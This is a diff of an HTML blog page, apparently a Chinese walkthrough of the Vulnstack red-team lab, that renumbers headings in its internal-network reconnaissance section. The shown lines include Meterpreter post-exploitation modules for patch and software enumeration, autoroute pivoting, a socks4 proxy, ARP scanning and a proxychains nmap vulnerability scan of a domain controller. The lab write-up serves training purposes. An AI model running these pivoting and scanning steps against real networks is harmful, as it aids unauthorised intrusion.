@@ -578,10 +578,10 @@ exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
 <h3 id="4-2-内网–继续信息收集"><a href="#4-2-内网–继续信息收集" class="headerlink" title="4.2 内网–继续信息收集"></a>4.2 内网–继续信息收集</h3><h4 id="4-2-1-补丁信息"><a href="#4-2-1-补丁信息" class="headerlink" title="4.2.1 补丁信息"></a>4.2.1 补丁信息</h4><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;enum_patches<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318173346684.png"></p>
-<h4 id="5-2-2-软件安装信息"><a href="#5-2-2-软件安装信息" class="headerlink" title="5.2.2 软件安装信息"></a>5.2.2 软件安装信息</h4><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;enum_applications<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="4-2-2-软件安装信息"><a href="#4-2-2-软件安装信息" class="headerlink" title="4.2.2 软件安装信息"></a>4.2.2 软件安装信息</h4><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;enum_applications<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318173500987.png"></p>
-<h4 id="5-2-3-路由信息并添加路由"><a href="#5-2-3-路由信息并添加路由" class="headerlink" title="5.2.3 路由信息并添加路由"></a>5.2.3 路由信息并添加路由</h4><p>添加路由到目标环境网络，使得msf能够通过win7路由转发访问192.168.25.0&#x2F;24网段</p>
+<h4 id="4-2-3-路由信息并添加路由"><a href="#4-2-3-路由信息并添加路由" class="headerlink" title="4.2.3 路由信息并添加路由"></a>4.2.3 路由信息并添加路由</h4><p>添加路由到目标环境网络，使得msf能够通过win7路由转发访问192.168.25.0&#x2F;24网段</p>
 <pre class="line-numbers language-none"><code class="language-none">#查看路由信息
 run get_local_subnets
 #添加一条路由
@@ -596,10 +596,10 @@ run autoroute -s 192.168.52.0&#x2F;24<span aria-hidden="true" class="line-number
 socks4 192.168.1.5 1080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>之后我们就可以使用proxychains代理nmap扫描主机</p>
-<h4 id="5-2-4-arp扫描内网主机"><a href="#5-2-4-arp扫描内网主机" class="headerlink" title="5.2.4 arp扫描内网主机"></a>5.2.4 arp扫描内网主机</h4><pre class="line-numbers language-none"><code class="language-none">run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner RHOSTS&#x3D;192.168.52.0&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="4-2-4-arp扫描内网主机"><a href="#4-2-4-arp扫描内网主机" class="headerlink" title="4.2.4 arp扫描内网主机"></a>4.2.4 arp扫描内网主机</h4><pre class="line-numbers language-none"><code class="language-none">run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner RHOSTS&#x3D;192.168.52.0&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318174314595.png"></p>
-<h4 id="5-2-5-内网扫描"><a href="#5-2-5-内网扫描" class="headerlink" title="5.2.5 内网扫描"></a>5.2.5 内网扫描</h4><p>扫描域控开放的端口及存在的相应漏洞</p>
+<h4 id="4-2-5-内网扫描"><a href="#4-2-5-内网扫描" class="headerlink" title="4.2.5 内网扫描"></a>4.2.5 内网扫描</h4><p>扫描域控开放的端口及存在的相应漏洞</p>
 <pre class="line-numbers language-none"><code class="language-none">proxychains nmap -sT -sV -Pn -p22,80,443,135,445 --script&#x3D;vuln 192.168.52.138<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318184046567.png"></p>
